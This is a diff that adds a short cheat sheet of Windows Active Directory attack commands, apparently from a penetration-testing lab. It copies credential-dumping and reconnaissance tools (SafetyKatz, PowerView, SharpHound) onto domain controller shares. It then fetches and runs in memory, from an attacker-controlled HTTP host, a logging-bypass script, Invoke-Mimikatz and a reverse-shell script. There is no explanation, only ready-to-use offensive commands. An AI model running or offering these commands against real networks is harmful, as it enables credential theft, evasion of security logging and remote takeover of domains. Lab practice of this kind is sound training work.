@@ -1,0 +1,14 @@
+echo F | xcopy C:\AD\Tools\SafetyKatz.exe \\dcorp-dc\C$\Users\Public\SafetyKatz.exe
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
+echo F | xcopy C:\AD\Tools\RunWithRegistryNonAdmin.bat \\dcorp-dc\C$\Users\Public\RunWithRegistryNonAdmin.bat
+echo F | xcopy C:\AD\Tools\PowerView.ps1 \\mcorp-dc\C$\Users\Public\PowerView.ps1
+echo F | xcopy C:\AD\Tools\Set-RemotePSRemoting.ps1 \\dcorp-ci\C$\Users\Public\Set-RemotePSRemoting.ps1
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Administrator\Desktop\Loader.exe
+echo F | xcopy C:\AD\Tools\SharpHound.ps1 \\dcorp-cd\C$\Users\Public\SharpHound.ps1
+
+iex (iwr http://172.16.100.87/sbloggingbypass.txt -UseBasicParsing)
+iex (iwr http://172.16.100.87/Invoke-Mimikatz.ps1 -UseBasicParsing)
+iex (iwr http://172.16.100.87/Invoke-PowerShellTcpEx.ps1 -UseBasicParsing)
+iex (iwr http://172.16.100.87/RunWithRegistryNonAdmin.bat -UseBasicParsing)
+iex (iwr http://172.16.100.87/PowerView.ps1 -UseBasicParsing)
+iex (iwr http://172.16.100.87/SharpHound.ps1 -UseBasicParsing)
